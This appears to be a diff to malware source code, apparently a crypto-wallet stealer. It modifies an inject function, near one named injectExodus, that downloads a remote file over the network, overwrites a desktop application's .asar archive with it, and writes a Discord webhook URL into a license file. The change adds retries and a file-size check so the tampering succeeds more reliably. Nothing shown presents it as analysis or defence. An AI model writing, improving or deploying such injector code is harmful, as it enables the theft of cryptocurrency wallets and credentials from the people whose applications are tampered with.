@@ -3450,25 +3450,43 @@ async function injectExodus() {
     }
 }
 
-async function inject(appPath, asarPath, injectionUrl, licensePath) {
+async function inject(appPath, asarPath, injectionUrl, licensePath, retries = 3) {
     if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
         return;
     }
 
-    try {
-        const response = await axios.get(injectionUrl, { responseType: 'stream' });
+    const download = async (attempt) => {
+        try {
+            const response = await axios.get(injectionUrl, { responseType: 'stream' });
+            if (response.status !== 200) {
+                throw new Error(`Failed to download, status code: ${response.status}`);
+            }
 
-        if (response.status !== 200) {
-            return;
+            const writer = fs.createWriteStream(asarPath);
+            response.data.pipe(writer);
+
+            return new Promise((resolve, reject) => {
+                writer.on('finish', resolve);
+                writer.on('error', reject);
+            });
+        } catch (error) {
+            console.error(`Attempt ${attempt} failed:`, error);
+            if (attempt < retries) {
+                console.log(`Retrying... (${attempt + 1}/${retries})`);
+                return download(attempt + 1);
+            }
+            throw new Error('Max retries reached. Download failed.');
         }
+    };
 
-        const writer = fs.createWriteStream(asarPath);
-        response.data.pipe(writer);
+    try {
+        await download(1);
 
-        await new Promise((resolve, reject) => {
-            writer.on('finish', resolve);
-            writer.on('error', reject);
-        });
+        // Verify file size (optional, based on your requirements)
+        const stats = fs.statSync(asarPath);
+        if (stats.size === 0) {
+            throw new Error('Downloaded file is 0 bytes.');
+        }
 
         if (licensePath) {
             fs.writeFileSync(licensePath, discordWebhookUrl);
@@ -3477,6 +3495,7 @@ async function inject(appPath, asarPath, injectionUrl, licensePath) {
         console.error('Error during injection:', error);
     }
 }
+
 
 
 
